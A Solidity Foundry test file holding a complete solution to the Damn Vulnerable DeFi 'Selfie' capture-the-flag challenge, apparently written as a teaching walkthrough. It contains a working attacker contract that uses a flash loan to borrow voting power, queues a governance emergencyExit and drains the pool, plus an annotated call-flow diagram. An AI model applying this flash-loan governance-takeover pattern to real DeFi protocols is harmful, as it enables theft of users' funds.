// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

// ================================================================
// CHALLENGE OVERVIEW: Selfie
// ================================================================
// SelfiePool holds 1,500,000 DVT tokens and offers free flash loans.
// The same DVT token is used for governance voting in SimpleGovernance.
// SelfiePool.emergencyExit() can drain the entire pool — but only
// callable by governance.
//
// VULNERABILITY:
//   SimpleGovernance checks voting power with getVotes() at queue time
//   (current balance snapshot), NOT at execution time.
//   This means a flash loan can temporarily grant >50% voting power,
//   queue emergencyExit(), repay the loan, then execute 2 days later.
//
// ATTACK PLAN:
//   tx1: Flash borrow 1.5M DVT → delegate to self → queue emergencyExit()
//        → repay loan (action stays queued permanently)
//   wait: vm.warp(+2 days) to pass the time-lock
//   tx2: executeAction() → pool drained to recovery address
// ================================================================

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player   = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL       = 1_500_000e18; // 75% of supply → easily >50%

    DamnValuableVotes token;
    SimpleGovernance  governance;
    SelfiePool        pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // ----------------------------------------------------------------
    // setUp() — Deploy and fund all contracts (DO NOT TOUCH)
    // ----------------------------------------------------------------
    function setUp() public {
        startHoax(deployer);

        token      = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(token);
        pool       = new SelfiePool(token, governance);

        // Fund pool with 1.5M DVT — this is what we will drain
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    function test_assertInitialState() public view {
        assertEq(address(pool.token()),                   address(token));
        assertEq(address(pool.governance()),              address(governance));
        assertEq(token.balanceOf(address(pool)),          TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)),       TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0),        0);
    }

    // ================================================================
    // SOLUTION: test_selfie()
    // ================================================================
    // Step 1 — Deploy attacker contract (player is msg.sender via prank)
    // Step 2 — startAttack(): flash loan → delegate → queue action
    // Step 3 — vm.warp: skip 2 days to satisfy ACTION_DELAY_IN_SECONDS
    // Step 4 — executeProposal(): trigger emergencyExit(recovery)
    // ================================================================
    function test_selfie() public checkSolvedByPlayer {
        // Deploy the attacker, passing all relevant contract addresses
        SelfieAttacker selfieAttacker = new SelfieAttacker(
            address(pool),
            address(governance),
            address(token),
            recovery
        );

        // TX 1: Flash borrow → delegate → queue emergencyExit → repay
        selfieAttacker.startAttack();

        // Advance chain time past the 2-day governance time-lock
        // (votes are already returned, but queued action is immutable)
        vm.warp(block.timestamp + 2 days);

        // TX 2: Execute the queued action — drains pool to recovery
        selfieAttacker.executeProposal();
    }

    // ----------------------------------------------------------------
    // _isSolved() — success conditions (DO NOT TOUCH)
    // ----------------------------------------------------------------
    function _isSolved() private view {
        assertEq(token.balanceOf(address(pool)), 0,              "Pool still has tokens");
        assertEq(token.balanceOf(recovery),      TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

// ================================================================
// ATTACKER CONTRACT: SelfieAttacker
// ================================================================
// Implements IERC3156FlashBorrower so it can receive flash loans
// from SelfiePool and execute the exploit inside the callback.
// ================================================================
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttacker is IERC3156FlashBorrower {

    // ----------------------------------------------------------------
    // State
    // ----------------------------------------------------------------
    address         recovery;   // destination for drained tokens
    SelfiePool      pool;       // flash loan source + drain target
    SimpleGovernance governance; // governance to queue action on
    DamnValuableVotes token;    // DVT — both loan asset and vote token
    uint            actionId;   // stored so executeProposal() can reference it

    // ERC-3156 standard magic return value
    // Pool checks: onFlashLoan() return == CALLBACK_SUCCESS, else revert
    // Must be keccak256("ERC3156FlashBorrower.onFlashLoan") exactly
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _pool,
        address _governance,
        address _token,
        address _recovery
    ) {
        pool       = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token      = DamnValuableVotes(_token);
        recovery   = _recovery;
    }

    // ================================================================
    // startAttack() — TX 1 entry point
    // ================================================================
    // Initiates a flash loan for the pool's entire DVT balance.
    // Execution continues inside onFlashLoan() callback below.
    // ================================================================
    function startAttack() external {
        // Borrow 100% of pool's DVT balance (1,500,000 DVT)
        // Fourth arg is arbitrary calldata — unused here
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            1_500_000 ether,
            ""
        );
    }

    // ================================================================
    // onFlashLoan() — ERC-3156 callback (called by SelfiePool)
    // ================================================================
    // At this point this contract holds 1,500,000 DVT (75% of supply).
    // We exploit the window before repayment to:
    //   1. Delegate votes to self  → satisfies >50% governance threshold
    //   2. Queue emergencyExit()   → permanently stored on-chain
    //   3. Approve repayment       → pool can pull tokens back
    //   4. Return magic hash       → pool confirms callback succeeded
    //
    // After this function returns, pool pulls back the tokens via
    // transferFrom() — votes drop to 0, but the queued action remains.
    // ================================================================
    function onFlashLoan(
        address _initiator,  // must be this contract (we started the loan)
        address /*_token*/,  // DVT address — already stored in state
        uint256 _amount,     // 1,500,000 DVT
        uint256 _fee,        // 0 (SelfiePool charges no fees)
        bytes calldata /*_data*/
    ) external returns (bytes32) {

        // Security checks — prevent unauthorized callback invocations
        require(msg.sender  == address(pool), "Only pool can call");
        require(_initiator  == address(this), "Initiator must be self");

        // ── EXPLOIT STEP 1 ──────────────────────────────────────────
        // Delegate all 1.5M DVT votes to this contract.
        // ERC20Votes.delegate() updates getVotes(address(this)) to 1.5M.
        // SimpleGovernance._hasEnoughVotes() checks getVotes() right now
        // → 1,500,000 > 1,000,000 (half of 2M total supply) ✓
        token.delegate(address(this));

        // ── EXPLOIT STEP 2 ──────────────────────────────────────────
        // Queue a governance action that calls emergencyExit(recovery).
        // This stores the action on-chain with proposedAt = block.timestamp.
        // The >50% vote check passes because we just delegated above.
        // After this tx, even when tokens are returned, action stays queued.
        actionId = governance.queueAction(
            address(pool),                                          // target contract
            0,                                                      // ETH value to send
            abi.encodeWithSignature("emergencyExit(address)", recovery) // calldata
        );

        // ── EXPLOIT STEP 3 ──────────────────────────────────────────
        // Approve pool to pull back the loan amount + fee (fee = 0 here).
        // Must be done before returning so transferFrom() succeeds.
        token.approve(address(pool), _amount + _fee);

        // ── EXPLOIT STEP 4 ──────────────────────────────────────────
        // Return the ERC-3156 magic value to signal successful callback.
        // Pool checks this hash — wrong value → CallbackFailed() revert.
        return CALLBACK_SUCCESS;
    }

    // ================================================================
    // executeProposal() — TX 2 entry point (called after 2-day warp)
    // ================================================================
    // Triggers the queued governance action.
    // SimpleGovernance.executeAction() calls:
    //   SelfiePool.emergencyExit(recovery)
    // which transfers pool's entire DVT balance to recovery address.
    // Note: anyone can call executeAction — not just the original proposer.
    // ================================================================
    function executeProposal() external {
        governance.executeAction(actionId);
    }
}

// SETUP
//   deployer mints 2,000,000 DVT
//   deployer funds SelfiePool with 1,500,000 DVT
//   ┌─────────────┐     holds 1.5M DVT      ┌──────────────────┐
//   │ SelfiePool  │ ◄────────────────────── │ SimpleGovernance │
//   │ 1.5M DVT    │     onlyGovernance gate │ needs >50% votes │
//   └─────────────┘                         └──────────────────┘

// ─────────────────────────────────────────────────────────────
// TX 1  (single transaction, Block N)
// ─────────────────────────────────────────────────────────────

//   player
//     │
//     └─► SelfieAttacker.startAttack()
//               │
//               └─► SelfiePool.flashLoan(attacker, DVT, 1.5M)
//                         │
//                         ├─ token.transfer(attacker, 1.5M DVT)
//                         │   attacker now holds 75% of total supply
//                         │
//                         └─► attacker.onFlashLoan() callback
//                                   │
//                                   ├─ token.delegate(self)
//                                   │   getVotes(attacker) = 1.5M
//                                   │   halfTotalSupply    = 1.0M
//                                   │   1.5M > 1.0M   threshold met
//                                   │
//                                   ├─ governance.queueAction(
//                                   │      pool,
//                                   │      emergencyExit(recovery)
//                                   │  )
//                                   │   action #1 stored on-chain
//                                   │   proposedAt = block.timestamp
//                                   │
//                                   ├─ token.approve(pool, 1.5M)
//                                   │
//                                   └─ return CALLBACK_SUCCESS
//                         │
//                         └─ token.transferFrom(attacker → pool)
//                             1.5M DVT returned to pool
//                             getVotes(attacker) drops to 0
//                               but action #1 is PERMANENTLY queued

// ─────────────────────────────────────────────────────────────
// WAIT  vm.warp(block.timestamp + 2 days)
// ─────────────────────────────────────────────────────────────
//   timeDelta >= ACTION_DELAY_IN_SECONDS  ✓

// ─────────────────────────────────────────────────────────────
// TX 2  (Block N + 2 days)
// ─────────────────────────────────────────────────────────────

//   player
//     │
//     └─► SelfieAttacker.executeProposal()
//               │
//               └─► governance.executeAction(1)
//                         │
//                         ├─ _canBeExecuted(1) ✓
//                         │   proposedAt != 0
//                         │   executedAt == 0
//                         │   timeDelta  >= 2 days
//                         │
//                         └─► pool.emergencyExit(recovery)
//                                   │
//                                   └─ token.transfer(recovery, 1.5M)

// ─────────────────────────────────────────────────────────────
// RESULT
// ─────────────────────────────────────────────────────────────
//   pool.balance    == 0          ✓
//   recovery.balance == 1,500,000 DVT  ✓
